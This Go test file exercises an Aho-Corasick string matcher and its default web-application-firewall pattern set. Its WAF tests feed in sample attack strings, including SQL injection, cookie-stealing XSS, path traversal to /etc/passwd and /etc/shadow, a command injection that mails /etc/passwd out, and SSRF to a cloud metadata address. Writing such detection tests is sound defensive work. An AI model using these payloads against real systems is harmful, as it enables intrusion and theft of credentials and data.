package security

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// ============================================================================
// Basic Correctness Tests
// ============================================================================

func TestAhoCorasick_EmptyAutomaton(t *testing.T) {
	ac := NewAhoCorasick()
	require.False(t, ac.IsBuilt())
	require.Equal(t, 0, ac.LenPatterns())

	result := ac.Search("any text here")
	assert.Nil(t, result)
}

func TestAhoCorasick_SinglePattern(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPattern(ACPattern{Pattern: "hello", Category: "test", Security: "low", ID: "p1"})
	ac.Build()
	require.True(t, ac.IsBuilt())
	require.Equal(t, 1, ac.LenPatterns())

	result := ac.Search("say hello")
	assert.Len(t, result, 1)
	assert.Equal(t, "hello", result[0].Pattern.Pattern)
	assert.Equal(t, 4, result[0].From)
	assert.Equal(t, 9, result[0].To)
}

func TestAhoCorasick_MultipleOccurrences(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPattern(ACPattern{Pattern: "aa", Category: "test", Security: "low", ID: "p1"})
	ac.Build()

	result := ac.Search("aaaaaa")
	assert.GreaterOrEqual(t, len(result), 5) // Overlapping matches expected
}

func TestAhoCorasick_NoMatch(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPattern(ACPattern{Pattern: "xyz", Category: "test", Security: "low", ID: "p1"})
	ac.AddPattern(ACPattern{Pattern: "abc", Category: "test", Security: "low", ID: "p2"})
	ac.Build()

	result := ac.Search("hello world")
	assert.Nil(t, result)
}

func TestAhoCorasick_CaseInsensitive(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPattern(ACPattern{Pattern: "hello", Category: "test", Security: "low", ID: "p1"})
	ac.Build()

	// Search should match regardless of case
	result := ac.Search("Say HELLO there")
	assert.Len(t, result, 1)

	result = ac.Search("HELLO WORLD")
	assert.Len(t, result, 1)
}

func TestAhoCorasick_BytesInterface(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPattern(ACPattern{Pattern: "binary", Category: "test", Security: "low", ID: "p1"})
	ac.AddPattern(ACPattern{Pattern: "data", Category: "test", Security: "low", ID: "p2"})
	ac.Build()

	input := []byte("binary data packet")
	result := ac.SearchBytes(input)
	assert.Len(t, result, 2)
}

// ============================================================================
// Multiple Patterns Tests
// ============================================================================

func TestAhoCorasick_MultiPattern_FoundAll(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPatterns([]ACPattern{
		{Pattern: "foo", Category: "a", Security: "low", ID: "1"},
		{Pattern: "bar", Category: "b", Security: "medium", ID: "2"},
		{Pattern: "baz", Category: "c", Security: "high", ID: "3"},
	})
	ac.Build()

	result := ac.Search("foo bar baz qux")
	assert.Len(t, result, 3)
	patternsFound := make(map[string]bool)
	for _, m := range result {
		patternsFound[m.Pattern.Pattern] = true
	}
	assert.True(t, patternsFound["foo"])
	assert.True(t, patternsFound["bar"])
	assert.True(t, patternsFound["baz"])
}

func TestAhoCorasick_PatternOverlap(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPatterns([]ACPattern{
		{Pattern: "he", Category: "short", Security: "low", ID: "1"},
		{Pattern: "she", Category: "short", Security: "low", ID: "2"},
		{Pattern: "his", Category: "medium", Security: "low", ID: "3"},
		{Pattern: "hers", Category: "medium", Security: "low", ID: "4"},
	})
	ac.Build()

	// "ushers" contains: she at [1:4], he at [2:4], hers at [2:6]
	// This is the classic Aho-Corasick overlap example (output links must fire).
	result := ac.Search("ushers")
	foundShe := false
	foundHe := false
	foundHers := false
	for _, m := range result {
		if m.Pattern.Pattern == "she" && m.From == 1 {
			foundShe = true
		}
		if m.Pattern.Pattern == "he" && m.From == 2 {
			foundHe = true
		}
		if m.Pattern.Pattern == "hers" && m.From == 2 {
			foundHers = true
		}
	}
	assert.True(t, foundShe, "should find 'she' at position 1")
	assert.True(t, foundHe, "should find 'he' at position 2")
	assert.True(t, foundHers, "should find 'hers' at position 2 via output link")
}

func TestAhoCorasick_NestedPattern(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPatterns([]ACPattern{
		{Pattern: "test", Category: "base", Security: "low", ID: "1"},
		{Pattern: "testing", Category: "extended", Security: "medium", ID: "2"},
	})
	ac.Build()

	result := ac.Search("this is a test sentence with testing")
	// Both patterns should be detected when they occur
	foundTest := false
	foundTesting := false
	for _, m := range result {
		if m.Pattern.Pattern == "test" {
			foundTest = true
		}
		if m.Pattern.Pattern == "testing" {
			foundTesting = true
		}
	}
	// At minimum, we should find at least one occurrence
	assert.GreaterOrEqual(t, len(result), 1)
	// 'test' is a proper suffix of 'testing', so output links must fire both
	assert.True(t, foundTest, "should detect 'test'")
	assert.True(t, foundTesting, "should detect 'testing'")
}

// ============================================================================
// Edge Cases
// ============================================================================

func TestAhoCorasick_EmptyString(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPattern(ACPattern{Pattern: "pattern", Category: "test", Security: "low", ID: "1"})
	ac.Build()

	result := ac.Search("")
	// Empty string returns empty slice (not nil) - acceptable for AC
	assert.Empty(t, result)
}

func TestAhoCorasick_SingleCharPattern(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPattern(ACPattern{Pattern: "x", Category: "test", Security: "low", ID: "1"})
	ac.Build()

	result := ac.Search("xxxxxx")
	assert.Len(t, result, 6) // Each 'x' matches independently
}

func TestAhoCorasick_LongText(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPattern(ACPattern{Pattern: "needle", Category: "test", Security: "low", ID: "1"})
	ac.Build()

	longText := strings.Repeat("This is a line without the target ", 1000) + " needle found " + strings.Repeat(" continuing here ", 1000)
	result := ac.Search(longText)
	assert.Len(t, result, 1)
	// The needle sits in the middle; verify the matched span length is correct.
	assert.Equal(t, 6, result[0].To-result[0].From)
	assert.Equal(t, "needle", longText[result[0].From:result[0].To])
}

func TestAhoCorasick_BinaryContent(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPatterns([]ACPattern{
		{Pattern: "\x00\x01\x02", Category: "binary", Security: "low", ID: "1"},
		{Pattern: "normal", Category: "text", Security: "low", ID: "2"},
	})
	ac.Build()

	data := []byte("normal data \x00\x01\x02 binary")
	result := ac.SearchBytes(data)
	assert.GreaterOrEqual(t, len(result), 1)
}

func TestAhoCorasick_VeryLongPattern(t *testing.T) {
	longPat := strings.Repeat("a", 10000)
	ac := NewAhoCorasick()
	ac.AddPattern(ACPattern{Pattern: longPat, Category: "test", Security: "low", ID: "1"})
	ac.Build()

	text := "prefix " + longPat + " suffix"
	result := ac.Search(text)
	assert.Len(t, result, 1)
	assert.Equal(t, 7, result[0].From)    // After "prefix "
	assert.Equal(t, 10007, result[0].To)  // Start + length
}

func TestAhoCorasick_AllSameChars(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPatterns([]ACPattern{
		{Pattern: "aaa", Category: "test", Security: "low", ID: "1"},
		{Pattern: "aaaa", Category: "test", Security: "low", ID: "2"},
		{Pattern: "aaaaa", Category: "test", Security: "low", ID: "3"},
	})
	ac.Build()

	result := ac.Search("aaaaaaaaaa")
	// Many overlapping matches expected
	assert.GreaterOrEqual(t, len(result), 10)
}

// ============================================================================
// Pattern Metadata
// ============================================================================

func TestAhoCorasick_MetadataPreserved(t *testing.T) {
	pat := ACPattern{
		Pattern:  "attack",
		Category: "sqli",
		Security: "critical",
		ID:       "sql-injection-001",
	}
	ac := NewAhoCorasick()
	ac.AddPattern(pat)
	ac.Build()

	result := ac.Search("database attack attempted")
	assert.Len(t, result, 1)
	assert.Equal(t, "attack", result[0].Pattern.Pattern)
	assert.Equal(t, "sqli", result[0].Pattern.Category)
	assert.Equal(t, "critical", result[0].Pattern.Security)
	assert.Equal(t, "sql-injection-001", result[0].Pattern.ID)
}

// ============================================================================
// Case Insensitivity Validation
// ============================================================================

func TestAhoCorasick_CaseInsensitivity_Comprehensive(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPattern(ACPattern{Pattern: "SQLi", Category: "sqli", Security: "critical", ID: "1"})
	ac.AddPattern(ACPattern{Pattern: "XSS", Category: "xss", Security: "high", ID: "2"})
	ac.Build()

	testCases := []struct {
		text       string
		expectLen  int
		categories map[string]bool
	}{
		{
			text:      "SQLi injection test",
			expectLen: 1,
		},
		{
			text:      "SQLi detected in payload",
			expectLen: 1,
		},
		{
			text:      "xss attempt found",
			expectLen: 1,
		},
		{
			text:      "MULTIPLE SQLi and XSS attacks",
			expectLen: 2,
		},
	}

	for _, tc := range testCases {
		result := ac.Search(tc.text)
		assert.Equal(t, tc.expectLen, len(result), "text=%q", tc.text)
	}
}

// ============================================================================
// WAF-Specific Pattern Tests
// ============================================================================

func TestDefaultWAFPatterns_Loads(t *testing.T) {
	pats := DefaultWAFPatterns()
	assert.NotEmpty(t, pats)
	assert.GreaterOrEqual(t, len(pats), 250) // Should have comprehensive coverage

	// Verify categories exist
	categories := make(map[string]int)
	for _, p := range pats {
		categories[p.Category]++
	}
	assert.True(t, categories["sqli"] > 0, "should have sqli patterns")
	assert.True(t, categories["xss"] > 0, "should have xss patterns")
	assert.True(t, categories["path_traversal"] > 0, "should have path_traversal patterns")
	assert.True(t, categories["rce"] > 0, "should have rce patterns")
	assert.True(t, categories["ssrf"] > 0, "should have ssrf patterns")
}

func TestDefaultWAFPatterns_DetectAttackTypes(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPatterns(DefaultWAFPatterns())
	ac.Build()

	type testcase struct {
		name   string
		text   string
		check  func(matches []ACMatch) bool
	}

	tests := []testcase{
		{
			name: "sqli_injection",
			text: "SELECT * FROM users WHERE id='1' OR '1'='1'",
			check: func(matches []ACMatch) bool {
				for _, m := range matches {
					if m.Pattern.Category == "sqli" {
						return true
					}
				}
				return false
			},
		},
		{
			name: "xss_script",
			text: "<script>alert(document.cookie)</script>",
			check: func(matches []ACMatch) bool {
				for _, m := range matches {
					if m.Pattern.Category == "xss" {
						return true
					}
				}
				return false
			},
		},
		{
			name: "path_traversal",
			text: "../../../etc/passwd",
			check: func(matches []ACMatch) bool {
				for _, m := range matches {
					if m.Pattern.Category == "path_traversal" {
						return true
					}
				}
				return false
			},
		},
		{
			name: "cmd_injection",
			text: "; cat /etc/passwd | mail admin@example.com",
			check: func(matches []ACMatch) bool {
				for _, m := range matches {
					if m.Pattern.Category == "rce" {
						return true
					}
				}
				return false
			},
		},
		{
			name: "ssrf_metadata",
			text: "http://169.254.169.254/latest/meta-data/",
			check: func(matches []ACMatch) bool {
				for _, m := range matches {
					if m.Pattern.Category == "ssrf" {
						return true
					}
				}
				return false
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := ac.Search(NormalizeToLower(tt.text))
			assert.True(t, tt.check(result), "expected pattern category detection in search results")
		})
	}
}

// ============================================================================
// Integration Sanity Check
// ============================================================================

func TestAhoCorasick_Integration_Sanity(t *testing.T) {
	ac := NewAhoCorasick()
	ac.AddPatterns(DefaultWAFPatterns())
	ac.Build()

	// Real-world attack payloads
	payloads := []string{
		"http://example.com/search?q=1' or '1'='1",
		"<img src=x onerror=alert(document.cookie)>",
		"https://app.internal/api/v1/admin/../config",
		"ls -la; cat /etc/shadow",
		"http://metadata.googlecompute.test/computeMetadata/v1/",
	}

	matches := 0
	for _, payload := range payloads {
		result := ac.Search(NormalizeToLower(payload))
		if len(result) > 0 {
			matches++
		}
	}
	assert.Equal(t, 5, matches, "all attack payloads should be detected")
}
